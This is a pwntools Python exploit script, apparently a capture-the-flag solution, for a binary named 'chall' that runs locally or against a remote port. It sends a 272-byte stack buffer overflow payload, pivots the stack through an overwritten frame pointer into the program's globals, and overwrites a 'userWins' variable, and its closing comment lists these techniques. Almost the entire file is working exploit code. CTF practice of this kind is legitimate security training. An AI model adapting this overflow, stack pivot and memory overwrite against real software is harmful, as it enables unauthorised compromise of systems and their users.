#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
ld = ELF('/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  b *main+98
  b *main+690
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

userWins = 0x4cab10
pop_rdi = p64(0x402611)
puts = 0x414260
print(f"userWins: {userWins:#x}")

pivot_payload = b'A' * 272 + p64(userWins + 0x100) + p64(elf.sym.main + 4)
# pivot_payload = b'A' * 272 + p64(userWins) + p64(elf.sym.main + 4)
p.sendlineafter(b'name: ', pivot_payload)
p.sendlineafter(b'choice (1-4): ', b'4')

anywhere_valid_for_rbp = 0x4cac10
overwrite_userWins = p64(0xdeadbeef) * 2 + p64(0x10000) + p64(0xcafebabe) * 31 + p64(anywhere_valid_for_rbp) + p64(elf.sym.main + 623)
p.sendlineafter(b'name: ', overwrite_userWins)
p.interactive()

# NOTE:
# Buffer Overflow
# Stack pivot
# Global variable overwrite
